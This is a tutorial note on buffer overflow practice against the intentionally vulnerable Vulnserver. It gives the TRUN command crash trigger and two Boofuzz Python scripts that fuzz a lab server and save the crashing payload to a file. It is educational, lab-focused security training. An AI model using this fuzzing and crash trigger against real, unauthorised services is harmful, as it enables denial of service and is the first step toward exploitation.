## TLDR; ##

* No bad chars
* Buffer is approx 4000 chars
* Use "TRUN ." + 4000 * "\x41" to trigger it

# Introduction to buffer overflow #

.... to do ....
Vulnserver is great resource for practicing buffer overflow.  
Source code can be found on: https://github.com/stephenbradshaw/vulnserver.  

## Fuzzing ##

To detect buffer overflow vulnerability, first we need to find a way to crash the application causing segmentation fault. There are many fuzzers which can be used, but most popular ones are Spike and Boofuzz with Spike being not developed any more and Boofuzz being actively developed.

### Boofuzz skeleton ###

```
#!/usr/bin/python
import sys
from boofuzz import *

host = '192.168.0.31'      # Server's IP address
port = 9999                # Port on which application is listening

def main():

   session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))

   s_initialize("TRUN command")           # session name
   s_string("TRUN", fuzzable = True)      # command name defined as string which should be fuzzed
   s_delim(" ", fuzzable = True)          # delimiter (space) which should be fuzzed
   s_string("TEST", fuzzable = True)      # command parameter defined as string which should be fuzzed

   session.connect(s_get("TRUN command"))
   session.fuzz()

if __name__ == "__main__":
    main()
 
```

Fuzzing can take a long time. To avoid looking at debugger and stoping fuzzer, we can extend script by adding receive_fuzzer function and post_test_case_callbacks=[receive_banner] argument to Session function call.  
Function receive_banner tries to get data from socket, and if no data is received it indicates that application is crashed and prints payload length and writes paylod to a file.

```
#!/usr/bin/python
import sys
from boofuzz import *

host = '192.168.0.31'      # Server's IP address
port = 9999                # Port on which application is listening
temp = " "                 # Global varialbe to store last sent payload.

# Function receive_banner is used to receive data from socket and detect crash when no resposne is detected
def receive_banner(target, fuzz_data_logger, session, sock):
   global temp 
   data=sock.recv(20000)   # Try to recieve data from socket and if banner is not detected report crash
   if not "Welcome to Vulnerable Server! Enter HELP for help." in data:
      print "\n######################################################\n"
      print "[+] No banner received - application may be crashed"
      print "[+] Payload length: " + str (len(temp))
      print "[+] Payload saved in crash_report.txt"
      print "[+] Fuzzing ended"
      print "\n######################################################\n"
      f = open("crash_report.txt", "w")
      f.write(temp)  # Write payload from temp global variable. Session.last_send containes next sent payload and not the one that crashed the application.
      f.close()
      sys.exit(-1)
   else:
      temp=session.last_send  # If banner is receviced from socket - store last sent payload into temp variable  

def main():

   session = Session(post_test_case_callbacks=[receive_banner], target = Target(connection = SocketConnection(host, port, proto='tcp')))

   s_initialize("TRUN command")
   s_string("TRUN", fuzzable = True)
   s_delim(" ", fuzzable = True)
   s_string("TEST", fuzzable = True)

   session.connect(s_get("TRUN command"))
   session.fuzz()

if __name__ == "__main__":
    main()
 
```
